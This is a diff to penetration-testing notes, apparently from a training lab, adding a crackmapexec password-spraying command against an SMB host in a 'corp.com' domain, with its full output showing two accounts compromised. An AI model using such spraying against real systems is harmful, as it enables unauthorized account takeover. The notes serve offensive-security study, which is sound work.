@@ -88,6 +88,36 @@ SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (
 ```
 {% endcode %}
 
+{% code title="crackmapexec with multiple passwors" lineNumbers="true" %}
+```
+crackmapexec smb 192.168.184.73 -u users.txt -p 'BrouhahaTungPerorateBroom2023!' 'HomeTaping199!' -d corp.com --continue-on-success
+SMB         192.168.184.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.184.73  445    FILES04          [-] corp.com\Administrator:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\Administrator:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\iis_service:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\iis_service:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\jen:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\jen:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\pete:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\pete:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\dave:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\dave:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\jeff:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\jeff:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\krbtgt:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\krbtgt:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\stephanie:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\stephanie:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\Guest:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\Guest:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [+] corp.com\jeffadmin:BrouhahaTungPerorateBroom2023! (Pwn3d!)
+SMB         192.168.184.73  445    FILES04          [-] corp.com\jeffadmin:HomeTaping199! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [-] corp.com\leon:BrouhahaTungPerorateBroom2023! STATUS_LOGON_FAILURE 
+SMB         192.168.184.73  445    FILES04          [+] corp.com\leon:HomeTaping199! (Pwn3d!)
+
+```
+{% endcode %}
+
 ### Kerbrute
 
 {% code title="" overflow="wrap" lineNumbers="true" %}
